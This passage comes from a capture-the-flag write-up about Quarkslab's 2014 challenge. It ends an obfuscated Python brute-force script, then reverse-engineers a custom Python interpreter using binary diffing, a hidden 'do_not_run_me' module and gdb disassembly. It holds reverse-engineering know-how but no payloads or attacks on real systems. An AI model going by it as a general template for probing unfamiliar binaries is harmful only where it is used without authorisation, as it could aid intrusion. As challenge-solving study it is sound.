</span><span class='line'>                                                    <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;s&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;s&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">s</span><span class="p">)</span> <span class="o">+</span>
</span><span class='line'>                                                    <span class="p">[((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;l&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">l</span><span class="p">)[(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)]</span> <span class="o">^</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;c&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;c&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">c</span><span class="p">))]</span>
</span><span class='line'>                                                <span class="p">)</span>
</span><span class='line'>                                            <span class="p">),</span>
</span><span class='line'>                                            <span class="n">x</span>
</span><span class='line'>                                        <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>                                    <span class="p">)</span>
</span><span class='line'>                                    <span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>                                <span class="p">)</span>
</span><span class='line'>                            <span class="p">)</span>
</span><span class='line'>                            <span class="c"># if ((x[&#39;g&#39;] % 4) and (x[&#39;i&#39;] &lt; len(l))) else x</span>
</span><span class='line'>                            <span class="k">if</span> <span class="p">(((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;g&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;g&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">g</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="ow">and</span> <span class="p">((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)</span><span class="o">&lt;</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;len&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;len&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="nb">len</span><span class="p">)((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;l&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">l</span><span class="p">))))</span>
</span><span class='line'>                            <span class="k">else</span> <span class="n">x</span>
</span><span class='line'>                        <span class="p">)</span>
</span><span class='line'>                    <span class="p">),</span>
</span><span class='line'>                    <span class="n">x</span>
</span><span class='line'>                <span class="p">)</span>
</span><span class='line'>            <span class="p">)</span>
</span><span class='line'>            <span class="c"># Returns { &#39;g&#39;:g, &#39;c&#39;:c, &#39;d&#39;:d, &#39;!&#39;:zip(tab1, tab0), &#39;l&#39;:zip(tab1, tab0), l1&#39;:tab1, &#39;l0&#39;:tab0, &#39;i&#39;: 0, &#39;j&#39;: 1302, &#39;!&#39;:0, &#39;s&#39;:[] }</span>
</span><span class='line'>            <span class="p">(</span>
</span><span class='line'>                <span class="p">(</span>
</span><span class='line'>                    <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                        <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">[]),</span>
</span><span class='line'>                        <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;s&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>                        <span class="n">x</span>
</span><span class='line'>                    <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>                <span class="p">)</span>
</span><span class='line'>                <span class="c"># Returns { &#39;g&#39;:g, &#39;c&#39;:c, &#39;d&#39;:d, &#39;!&#39;:zip(tab1, tab0), &#39;l&#39;:zip(tab1, tab0), l1&#39;:tab1, &#39;l0&#39;:tab0, &#39;i&#39;: 0, &#39;j&#39;: 1302, &#39;!&#39;:0}</span>
</span><span class='line'>                <span class="p">(</span>
</span><span class='line'>                    <span class="p">(</span>
</span><span class='line'>                        <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                            <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;d&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;d&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">d</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;d&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;d&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">d</span><span class="p">))),</span>
</span><span class='line'>                            <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>                            <span class="n">x</span>
</span><span class='line'>                        <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>                    <span class="p">)</span>
</span><span class='line'>                    <span class="c"># Returns { &#39;g&#39; : g, &#39;c&#39;, &#39;d&#39;: d, &#39;!&#39;:zip(tab1, tab0), &#39;l&#39;:zip(tab1, tab0), l1&#39;:tab1, &#39;l0&#39;:tab0, &#39;i&#39;: (1371, 1302), &#39;j&#39;: 1302}</span>
</span><span class='line'>                    <span class="p">(</span>
</span><span class='line'>                        <span class="p">(</span>
</span><span class='line'>                            <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                                <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">[(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;j&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;j&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">j</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span><span class="p">[</span> <span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;zip&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;zip&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="nb">zip</span><span class="p">)((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;l0&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l0&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">l0</span><span class="p">),</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;l1&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l1&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">l1</span><span class="p">))</span> <span class="k">for</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;j&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)]),</span>
</span><span class='line'>                                <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>                                <span class="n">x</span>
</span><span class='line'>                            <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>                        <span class="p">)</span>
</span><span class='line'>                        <span class="c"># Returns { &#39;g&#39; : g, &#39;c&#39;, &#39;d&#39;: d, &#39;!&#39;:tab1, &#39;l1&#39;:tab1, &#39;l0&#39;:tab0}</span>
</span><span class='line'>                        <span class="p">(</span>
</span><span class='line'>                            <span class="p">(</span>
</span><span class='line'>                                <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                                    <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="n">tab1</span><span class="p">),</span>
</span><span class='line'>                                    <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l1&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>                                    <span class="n">x</span>
</span><span class='line'>                                <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>                            <span class="p">)</span>
</span><span class='line'>                            <span class="c"># Return { &#39;g&#39; : g, &#39;c&#39;, &#39;d&#39;: d, &#39;!&#39; : tab0, &#39;l0&#39;:tab0}</span>
</span><span class='line'>                            <span class="p">(</span>
</span><span class='line'>                                <span class="p">(</span>
</span><span class='line'>                                    <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                                        <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="n">tab0</span><span class="p">),</span>
</span><span class='line'>                                        <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l0&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>                                        <span class="n">x</span>
</span><span class='line'>                                    <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>                                <span class="p">)</span>
</span><span class='line'>                                <span class="p">({</span> <span class="s">&#39;g&#39;</span><span class="p">:</span> <span class="n">g</span><span class="p">,</span> <span class="s">&#39;c&#39;</span><span class="p">:</span> <span class="n">c</span><span class="p">,</span> <span class="s">&#39;d&#39;</span><span class="p">:</span> <span class="n">d</span><span class="p">,</span> <span class="s">&#39;$&#39;</span><span class="p">:</span> <span class="bp">None</span><span class="p">})</span>
</span><span class='line'>                            <span class="p">)</span>
</span><span class='line'>                        <span class="p">)</span>
</span><span class='line'>                    <span class="p">)</span>
</span><span class='line'>                <span class="p">)</span>
</span><span class='line'>            <span class="p">)</span>
</span><span class='line'>        <span class="p">)[</span><span class="s">&#39;$&#39;</span><span class="p">]</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">):</span>
</span><span class='line'>        <span class="k">try</span><span class="p">:</span>
</span><span class='line'>            <span class="n">ret</span> <span class="o">=</span> <span class="n">func</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>            <span class="k">if</span> <span class="s">&#39;quarks&#39;</span> <span class="ow">in</span> <span class="n">ret</span><span class="p">:</span>
</span><span class='line'>                <span class="k">print</span> <span class="n">ret</span>
</span><span class='line'>        <span class="k">except</span><span class="p">:</span>
</span><span class='line'>            <span class="k">pass</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="n">main</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">),</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>And after running it, we are good to go:</p>

<figure class='code'><figcaption><span>w00tw00t</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>D:\Codes\challenges\ql-python&gt;bf_with_lambdas_cleaned.py
</span><span class='line'>/blog.quarkslab.com/static/resources/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span></code></pre></td></tr></table></div></figure>


<h1>A custom ELF64 Python interpreter you shall debug</h1>

<h2>Recon</h2>

<p>All right, here we are: we now have the real challenge. First, let&rsquo;s see what kind of information we get for free:</p>

<figure class='code'><figcaption><span>recon</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>overclok@wildout:~/chall/ql-py<span class="nv">$ </span>file b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf: ELF 64-bit LSB  executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>,
</span><span class='line'><span class="k">for </span>GNU/Linux 2.6.26, not stripped
</span><span class='line'>overclok@wildout:~/chall/ql-py<span class="nv">$ </span>ls -lah b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>-rwxrw-r-x 1 overclok overclok 7.9M Sep  8 21:03 b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span></code></pre></td></tr></table></div></figure>


<p>The binary is quite big, not good for us. But on the other hand, the binary isn&rsquo;t stripped so we might find useful debugging information at some point.</p>

<figure class='code'><figcaption><span>./b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>overclok@wildout:~/chall/ql-py<span class="nv">$ </span>/usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>Python 2.7.8+ <span class="o">(</span>nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46<span class="o">)</span>
</span><span class='line'><span class="o">[</span>GCC 4.8.2<span class="o">]</span> on linux2
</span><span class='line'>Type <span class="s2">&quot;help&quot;</span>, <span class="s2">&quot;copyright&quot;</span>, <span class="s2">&quot;credits&quot;</span> or <span class="s2">&quot;license&quot;</span> <span class="k">for </span>more information.
</span><span class='line'>&gt;&gt;&gt;
</span></code></pre></td></tr></table></div></figure>


<p>That does explain the size of the binary then: we basically have something that looks like a custom Python interpreter. Note that I also remembered reading <em><a href="http://blog.quarkslab.com/building-an-obfuscated-python-interpreter-we-need-more-opcodes.html">Building an obfuscated Python interpreter: we need more opcodes</a></em> on <em>Quarkslab</em>&rsquo;s blog where Serge described how you could tweak the interpreter sources to add / change some opcodes either for optimization or obfuscation purposes.</p>

<h2>Finding the interesting bits</h2>

<p>The next step is to figure out what part of the binary is interesting, what functions have been modified, and where we find the problem we need to solve to get the flag. My idea for that was to use a <em>binary-diffing</em> tool between an original <em>Python278</em> interpreter and the one we were given.</p>

<p>To do so I just grabbed <em>Python278</em>&rsquo;s sources and compiled them by myself:</p>

<figure class='code'><figcaption><span>compiling Py278</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>overclok@wildout:~/chall/ql-py<span class="nv">$ </span>wget https://www.python.org/ftp/python/2.7.8/Python-2.7.8.tgz <span class="o">&amp;&amp;</span> tar xzvf Python-2.7.8.tgz
</span><span class='line'>overclok@wildout:~/chall/ql-py<span class="nv">$ </span>tar xzvf Python-2.7.8.tgz
</span><span class='line'>overclok@wildout:~/chall/ql-py<span class="nv">$ </span><span class="nb">cd </span>Python-2.7.8/ <span class="o">&amp;&amp;</span> ./configure <span class="o">&amp;&amp;</span> make
</span><span class='line'>overclok@wildout:~/chall/ql-py/Python-2.7.8<span class="nv">$ </span>ls -lah ./python
</span><span class='line'>-rwxrwxr-x 1 overclok overclok 8.0M Sep  5 00:13 ./python
</span></code></pre></td></tr></table></div></figure>


<p>The resulting binary has a similar size, so it should do the job even if I&rsquo;m not using <em>GCC 4.8.2</em> and the same compilation/optimization options. To perform the <em>diffing</em> I used <em>IDA Pro</em> and <a href="https://code.google.com/p/patchdiff2/">Patchdiff v2.0.10</a>.</p>

<figure class='code'><figcaption><span>Patchdiff result</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>---------------------------------------------------
</span><span class='line'>PatchDiff Plugin v2.0.10
</span><span class='line'>Copyright (c) 2010-2011, Nicolas Pouvesle
</span><span class='line'>Copyright (C) 2007-2009, Tenable Network Security, Inc
</span><span class='line'>---------------------------------------------------
</span><span class='line'>
</span><span class='line'>Scanning for functions ...
</span><span class='line'>parsing second idb...
</span><span class='line'>parsing first idb...
</span><span class='line'>diffing...
</span><span class='line'>Identical functions:   2750
</span><span class='line'>Matched functions:     176
</span><span class='line'>Unmatched functions 1: 23
</span><span class='line'>Unmatched functions 2: 85
</span><span class='line'>done!
</span></code></pre></td></tr></table></div></figure>


<p>Once the tool has finished its analysis we just have to check the list of unmatched function names (around one hundred of them, so it&rsquo;s pretty quick), and eventually we see that:</p>

<p><img class="center" src="http://doar-e.github.io/images/dissection_of_quarkslab_s_2014_security_challenge/initdo_not_run_me.png"></p>

<p>That function directly caught my eyes (you can even check it doesn&rsquo;t exist in the <em>Python278</em> source tree obviously :&ndash;)), and it appears this function is just setting up a Python module called <em>do_not_run_me</em>.</p>

<p><img class="center" src="http://doar-e.github.io/images/dissection_of_quarkslab_s_2014_security_challenge/initdonotrunme_assembly.png"></p>

<p>Let&rsquo;s import it:</p>

<figure class='code'><figcaption><span>do_not_run_me module</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">overclok</span><span class="nd">@wildout</span><span class="p">:</span><span class="o">~/</span><span class="n">chall</span><span class="o">/</span><span class="n">ql</span><span class="o">-</span><span class="n">py</span><span class="err">$</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf</span>
</span><span class='line'><span class="n">iPython</span> <span class="mf">2.7</span><span class="o">.</span><span class="mi">8</span><span class="o">+</span> <span class="p">(</span><span class="n">nvcs</span><span class="o">/</span><span class="n">newopcodes</span><span class="p">:</span><span class="n">a9bd62e4d5f2</span><span class="o">+</span><span class="p">,</span> <span class="n">Sep</span>  <span class="mi">1</span> <span class="mi">2014</span><span class="p">,</span> <span class="mi">11</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">46</span><span class="p">)</span>
</span><span class='line'><span class="p">[</span><span class="n">GCC</span> <span class="mf">4.8</span><span class="o">.</span><span class="mi">2</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux2</span>
</span><span class='line'><span class="n">Type</span> <span class="s">&quot;help&quot;</span><span class="p">,</span> <span class="s">&quot;copyright&quot;</span><span class="p">,</span> <span class="s">&quot;credits&quot;</span> <span class="ow">or</span> <span class="s">&quot;license&quot;</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">do_not_run_me</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">do_not_run_me</span><span class="o">.</span><span class="n">__doc__</span>
</span><span class='line'><span class="bp">None</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="nb">dir</span><span class="p">(</span><span class="n">do_not_run_me</span><span class="p">)</span>
</span><span class='line'><span class="p">[</span><span class="s">&#39;__doc__&#39;</span><span class="p">,</span> <span class="s">&#39;__name__&#39;</span><span class="p">,</span> <span class="s">&#39;__package__&#39;</span><span class="p">,</span> <span class="s">&#39;run_me&#39;</span><span class="p">]</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">do_not_run_me</span><span class="o">.</span><span class="n">run_me</span><span class="o">.</span><span class="n">__doc__</span>
</span><span class='line'><span class="n">There</span> <span class="n">are</span> <span class="n">two</span> <span class="n">kinds</span> <span class="n">of</span> <span class="n">people</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">world</span><span class="p">:</span> <span class="n">those</span> <span class="n">who</span> <span class="n">say</span> <span class="n">there</span> <span class="ow">is</span> <span class="n">no</span> <span class="n">such</span> <span class="n">thing</span> <span class="k">as</span> <span class="n">infinite</span> <span class="n">recursion</span><span class="p">,</span> <span class="ow">and</span> <span class="n">those</span> <span class="n">who</span> <span class="n">say</span> <span class="sb">``</span><span class="n">There</span> <span class="n">are</span> <span class="n">two</span> <span class="n">kinds</span> <span class="n">of</span> <span class="n">people</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">world</span><span class="p">:</span> <span class="n">those</span> <span class="n">who</span> <span class="n">say</span> <span class="n">there</span> <span class="ow">is</span> <span class="n">no</span> <span class="n">such</span> <span class="n">thing</span> <span class="k">as</span> <span class="n">infinite</span> <span class="n">recursion</span><span class="p">,</span> <span class="ow">and</span> <span class="n">those</span> <span class="n">who</span> <span class="n">say</span> <span class="o">...</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">do_not_run_me</span><span class="o">.</span><span class="n">run_me</span><span class="p">(</span><span class="s">&#39;doar-e&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">Segmentation</span> <span class="n">fault</span>
</span></code></pre></td></tr></table></div></figure>


<p>All right, we now have something to look at and we are going to do so from a low level point of view because that&rsquo;s what I like ; so don&rsquo;t expect big/magic hacks here :).</p>

<p>If you are not really familiar with Python&rsquo;s VM structures I would advise you to read quickly through this article <em><a href="https://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/">Deep Dive Into Python’s VM: Story of LOAD_CONST Bug</a></em>, and you should be all set for the next parts.</p>

<h2>do_not_run_me.run_me</h2>

<p>The function is quite small, so it should be pretty quick to analyze:</p>

<ol>
<li>the first part makes sure that we pass a string as an argument when calling <em>run_me</em>,</li>
<li>then a custom <em>marshaled</em> function is loaded, a function is created out of it, and called,</li>
<li>after that it creates another function from the string we pass to the function (which explains the <em>segfault</em> just above),</li>
<li>finally, a last function is created from another hardcoded <em>marshaled</em> string.</li>
</ol>


<h3>First marshaled function</h3>

<p>To understand it we have to dump it first, to unmarshal it and to analyze the resulting code object:</p>

<figure class='code'><figcaption><span>unmarshaling the first function</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>overclok@wildout:~/chall/ql-py$ gdb -q /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>Reading symbols from /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf...done.
</span><span class='line'>gdb$ set disassembly-flavor intel
</span><span class='line'>gdb$ disass run_me
</span><span class='line'>Dump of assembler code for function run_me:
</span><span class='line'>   0x0000000000513d90 &lt;+0&gt;:     push   rbp
</span><span class='line'>   0x0000000000513d91 &lt;+1&gt;:     mov    rdi,rsi
</span><span class='line'>   0x0000000000513d94 &lt;+4&gt;:     xor    eax,eax
</span><span class='line'>   0x0000000000513d96 &lt;+6&gt;:     mov    esi,0x56c70b
</span><span class='line'>   0x0000000000513d9b &lt;+11&gt;:    push   rbx
</span><span class='line'>   0x0000000000513d9c &lt;+12&gt;:    sub    rsp,0x28
</span><span class='line'>   0x0000000000513da0 &lt;+16&gt;:    lea    rcx,[rsp+0x10]
</span><span class='line'>   0x0000000000513da5 &lt;+21&gt;:    mov    rdx,rsp
</span><span class='line'>
</span><span class='line'>   ; Parses the arguments we gave, it expects a string object
</span><span class='line'>   0x0000000000513da8 &lt;+24&gt;:    call   0x4cf430 &lt;PyArg_ParseTuple&gt;
</span><span class='line'>   0x0000000000513dad &lt;+29&gt;:    xor    edx,edx
</span><span class='line'>   0x0000000000513daf &lt;+31&gt;:    test   eax,eax
</span><span class='line'>   0x0000000000513db1 &lt;+33&gt;:    je     0x513e5e &lt;run_me+206&gt;
</span><span class='line'>
</span><span class='line'>   0x0000000000513db7 &lt;+39&gt;:    mov    rax,QWORD PTR [rip+0x2d4342]
</span><span class='line'>   0x0000000000513dbe &lt;+46&gt;:    mov    esi,0x91
</span><span class='line'>   0x0000000000513dc3 &lt;+51&gt;:    mov    edi,0x56c940
</span><span class='line'>   0x0000000000513dc8 &lt;+56&gt;:    mov    rax,QWORD PTR [rax+0x10]
</span><span class='line'>   0x0000000000513dcc &lt;+60&gt;:    mov    rbx,QWORD PTR [rax+0x30]
</span><span class='line'>
</span><span class='line'>   ; Creates a code object from the marshaled string
</span><span class='line'>   ; PyObject* PyMarshal_ReadObjectFromString(char *string, Py_ssize_t len)
</span><span class='line'>   0x0000000000513dd0 &lt;+64&gt;:    call   0x4dc020 &lt;PyMarshal_ReadObjectFromString&gt;
</span><span class='line'>   0x0000000000513dd5 &lt;+69&gt;:    mov    rdi,rax
</span><span class='line'>   0x0000000000513dd8 &lt;+72&gt;:    mov    rsi,rbx
</span><span class='line'>
</span><span class='line'>   ; Creates a function object from the marshaled string
</span><span class='line'>   0x0000000000513ddb &lt;+75&gt;:    call   0x52c630 &lt;PyFunction_New&gt;
</span><span class='line'>   0x0000000000513de0 &lt;+80&gt;:    xor    edi,edi
</span><span class='line'>[...]
</span><span class='line'>gdb$ r -c &#39;import do_not_run_me as v; v.run_me(&quot;&quot;)&#39;
